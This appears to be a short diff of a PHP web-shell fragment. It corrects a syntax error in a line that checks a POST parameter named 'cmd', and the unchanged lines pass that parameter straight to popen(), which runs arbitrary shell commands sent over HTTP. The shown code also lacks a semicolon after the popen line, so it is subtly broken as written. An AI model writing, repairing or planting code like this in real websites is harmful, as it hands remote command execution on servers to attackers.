@@ -1,5 +1,5 @@
 <?php
-if($_POST['cmd']!="php_eval"))
+if($_POST['cmd']!="php_eval")
 {
 	$f = @popen($_POST['cmd'],"r")
     $res = "";
